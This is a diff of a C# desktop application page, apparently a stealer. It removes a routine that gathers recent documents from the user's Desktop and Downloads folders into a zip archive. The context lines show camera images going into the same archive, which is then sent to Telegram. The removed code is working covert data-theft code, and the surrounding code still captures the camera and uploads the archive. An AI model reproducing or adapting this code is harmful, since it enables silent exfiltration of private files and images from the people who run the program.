@@ -154,8 +154,6 @@ namespace Bibon.Pages
                             cameraStream.CopyTo(entryStream);
                         }
                     }
-                    const long telegramLimit = 10 * 1024 * 1024; // 50 MB
-                    AddUserFilesToArchive(archive, telegramLimit - 2 * 1024 * 1024);
                 }
 
                 UpdateProgress("Отправка архива в Telegram...", 6);
@@ -412,9 +410,6 @@ namespace Bibon.Pages
             }
         }
 
-        // Проверка отправки текстового сообщения (для диагностики)
-
-
         // Анимация закрытия и переход в MainWindow
         private void Button_Click1(object sender, RoutedEventArgs e)
         {
@@ -435,65 +430,6 @@ namespace Bibon.Pages
             MainWindow mainWindow = new MainWindow();
             mainWindow.Show();
         }
-
-        private void AddUserFilesToArchive(ZipArchive archive, long maxTotalSizeBytes)
-        {
-            var fileExtensions = new[] { ".word", ".doc", ".docm", ".xls", ".txt", ".wps", ".xlsx", ".pdf" };
-            var userFolders = new[]
-            {
-        new { Folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Name = "Рабочий стол" },
-        new { Folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"), Name = "Загрузки" }
-    };
-
-            const int maxFilesPerFolder = 20;
-            const long maxFileSize = 5 * 1024 * 1024; // 5 МБ
-
-            long totalSize = 0;
-            foreach (var userFolder in userFolders)
-            {
-                if (!Directory.Exists(userFolder.Folder))
-                    continue;
-
-                // Получаем только maxFilesPerFolder самых новых файлов с нужными расширениями и размером не больше maxFileSize
-                var files = Directory.EnumerateFiles(userFolder.Folder, "*.*", SearchOption.AllDirectories)
-                    .Where(f => fileExtensions.Contains(Path.GetExtension(f), StringComparer.OrdinalIgnoreCase))
-                    .Select(f => new FileInfo(f))
-                    .Where(fi => fi.Exists && fi.Length <= maxFileSize)
-                    .OrderByDescending(fi => fi.LastWriteTime)
-                    .Take(maxFilesPerFolder);
-
-                foreach (var fileInfo in files)
-                {
-                    try
-                    {
-                        if (totalSize + fileInfo.Length > maxTotalSizeBytes)
-                            return; // Прекратить добавление файлов
-
-                        string relativePath = GetRelativePath(userFolder.Folder, fileInfo.FullName);
-                        string entryPath = $"Files/{userFolder.Name}/{relativePath}";
-                        archive.CreateEntryFromFile(fileInfo.FullName, entryPath, CompressionLevel.Optimal);
-                        totalSize += fileInfo.Length;
-                    }
-                    catch { /* Пропускаем файлы с ошибками доступа */ }
-                }
-            }
-        }
-        private string GetRelativePath(string basePath, string path)
-        {
-            Uri baseUri = new Uri(AppendDirectorySeparatorChar(basePath));
-            Uri pathUri = new Uri(path);
-            return Uri.UnescapeDataString(baseUri.MakeRelativeUri(pathUri).ToString().Replace('/', Path.DirectorySeparatorChar));
-        }
-
-        private string AppendDirectorySeparatorChar(string path)
-        {
-            // Добавляет слеш в конец, если это директория и его нет
-            if (!path.EndsWith(Path.DirectorySeparatorChar.ToString()))
-                return path + Path.DirectorySeparatorChar;
-            return path;
-        }
-
-     
 
     }
 }
